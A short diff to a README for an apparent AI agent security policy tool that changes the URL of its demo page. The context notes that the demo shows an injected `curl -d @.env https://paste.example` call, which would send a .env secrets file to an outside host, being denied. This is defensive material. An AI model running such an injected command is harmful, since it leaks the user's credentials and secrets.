@@ -31,7 +31,7 @@ AI Security Command Center (`ascc`) is a policy decision point for AI agents. Th
   WebAssembly on a planted setup and shows an injected `curl -d @.env https://paste.example` denied on first
   load. The visitor can edit the policy, replay calls, edit the audit log and flip the kill switch.
   `.github/workflows/pages.yml` publishes it from `main` to
-  `https://ai-automation-tools.dev/ai-security-command-center/`, after the page test passes.
+  `https://ai-security-command-center-demo.ai-automation-tools.dev/`, after the page test passes.
 
 Public-MVP spec: `docs/product/spec.md`. Slice order: `docs/product/build-plan.md`. Work queue:
 `docs/ROADMAP.md`. The full platform design (gateway, STS, egress, broker, plugin host, connectors, console) is
